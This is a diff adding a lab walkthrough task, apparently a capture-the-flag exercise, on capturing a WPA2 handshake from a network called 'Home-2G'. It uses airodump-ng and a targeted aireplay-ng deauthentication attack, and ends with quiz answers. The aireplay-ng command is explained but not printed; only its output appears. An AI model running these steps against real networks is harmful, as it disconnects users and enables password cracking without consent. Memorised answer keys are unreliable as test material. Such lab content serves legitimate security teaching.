@@ -344,3 +344,87 @@ The eviction uses the unauthenticated deauthentication frame described in the re
 
 *The key derived from the passphrase and the SSID using PBKDF2 has a three-letter abbreviation. What is it?* 
 **Answer:** PMK
+
+## Task 5: Capturing the Handshake  
+
+A four-way handshake is only of use once it exists as a file on disk. It crosses the air at the single moment a client joins, so capturing one needs a radio already listening on the right channel when that moment arrives, and a client persuaded to join at a time of the attacker's choosing rather than its own.
+
+The target is Home-2G, WPA2-PSK on channel 6 at BSSID F0:9F:C2:71:22:12.
+
+**Locking the Capture Onto the Target**  
+
+A hopping card is listening elsewhere for most of every second, and the four handshake frames pass in a fraction of it, so pin airodump-ng to the channel and filter to the single access point:  
+
+```console
+user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:12 -w home2g wlan0mon
+```
+
+The flags are the ones aimed at Guest-WiFi in Task 3, pointed at Home-2G here. Leave the window running for the remainder of the task.  
+
+
+```console
+ CH  6 ][ Elapsed: 24 s ][ 2026-07-04 15:10
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ F0:9F:C2:71:22:12  -28   0      241       58    1   6   54   WPA2 CCMP   PSK  Home-2G
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -38   0 - 6e     0      72
+ F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -41   0 - 6      0      35
+```
+
+The single row in the upper table is the access point itself, with WPA2 under ENC and PSK under AUTH. The lower table is the station list, carrying one row for every client airodump-ng has heard exchanging frames with that access point, and here it holds two, 28:6C:07:6F:F9:43 and 28:6C:07:6F:F9:44. The Frames column counts what has been received from each, so a count that climbs while the capture runs marks a station that is actively transmitting rather than one heard only once.  
+
+Either will serve as a target. Waiting for one to reconnect of its own accord would produce a handshake eventually, but offers no control over timing, so the reconnection is provoked instead.  
+
+**Forcing a Reconnect With aireplay-ng**
+
+aireplay-ng is the injection tool of the aircrack-ng suite, and it forges the deauthentication frame described in Task 4. Leave airodump-ng running and open a second terminal:   
+
+-0 selects the deauthentication attack, and the 6 following it is the number of bursts. -a identifies the access point and -c targets one specific station. Targeting a named client disturbs only that device, which is quieter and more reliable than the broadcast deauthentication sent when -c is omitted.  
+
+```console
+15:10:42  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:12) on channel 6
+15:10:42  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+15:10:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+15:10:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+15:10:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+15:10:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+15:10:45  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
+```
+
+The ACKs count is not the success signal here. The simulated radios never report acknowledgements back, so the count remains at zero on every burst while the deauthentication still reaches its target and the client still reconnects. Success is confirmed instead by airodump-ng displaying WPA handshake: in its header and adding an EAPOL note to the targeted station. EAPOL, Extensible Authentication Protocol over LAN, is the frame type the four handshake messages travel in, so that note marks a station whose handshake frames have reached the capture.  
+
+**Confirming the Handshake**
+
+Return to the airodump-ng window:  
+
+```console
+ CH  6 ][ Elapsed: 48 s ][ 2026-07-04 15:10 ][ WPA handshake: F0:9F:C2:71:22:12
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ F0:9F:C2:71:22:12  -28   0      412      131    3   6   54   WPA2 CCMP   PSK  Home-2G
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -38   0 - 6e     0     118  EAPOL
+ F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -41   0 - 6      0      35
+```
+
+WPA handshake: F0:9F:C2:71:22:12 in the header confirms a complete handshake for that BSSID, and the targeted client's row has gained an EAPOL note. If the header does not show it, run the aireplay-ng burst again.  
+
+<img width="2171" height="843" alt="image" src="https://github.com/user-attachments/assets/74b6a17b-44a4-47bf-9dcb-d613488cd98d" />
+
+Stop the capture with Ctrl+C. The file required is home2g-01.cap.  
+
+**Answer the questions below**  
+
+**Which aireplay-ng attack-mode number sends deauthentication frames?**
+*Answer:* 0
+
+**What short phrase does airodump-ng display in the top-right of its header once the handshake has been captured?**
+*Answer:* WPA handshake
+
